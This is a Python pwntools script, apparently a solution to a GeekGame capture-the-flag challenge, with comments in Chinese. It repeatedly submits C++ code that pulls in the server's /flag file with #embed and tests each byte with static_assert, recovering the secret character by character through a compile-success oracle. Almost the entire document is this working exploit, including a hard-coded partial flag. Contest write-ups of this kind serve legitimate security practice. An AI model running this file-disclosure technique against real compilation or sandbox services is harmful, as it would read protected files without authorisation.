from time import sleep

from pwn import *

context(arch='amd64', os='linux', log_level='info')  # 一些基本的配置。

TOKEN = b'<TOKEN_DELETED>'

p = connect('prob07.geekgame.pku.edu.cn', 10007)

p.sendline(TOKEN)
p.recv(16384)
p.recv(16384)

CHARSET = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!-.,'

flag = ''

# 好像有次数限制，然后会卡住，所以每次跑一点
HAS_KNOWN = b'flag{ESCape_TechnIQUes_uPDAte_wItH_tIm'

i = 0
while True:
    for c in CHARSET:
        if i < len(HAS_KNOWN):
            if c != HAS_KNOWN[i]:
                continue
        code = '''
constexpr unsigned char config_data[] = {
    #embed "/flag" limit(1024) if_empty(0x00)
};
static_assert(config_data[''' + str(i) + '] == ' + str(c) + ''');

int main() {return 0;}
END'''
        p.sendline(code.encode())
        resp = p.recv(16384)
        if 'Success' in resp.decode():
            flag += chr(c)
            print('Found char:', chr(c), 'Current flag:', flag)
            break
        sleep(0.2)

    i += 1
    if c == ord('}'):
        break

print('Final flag:', flag)
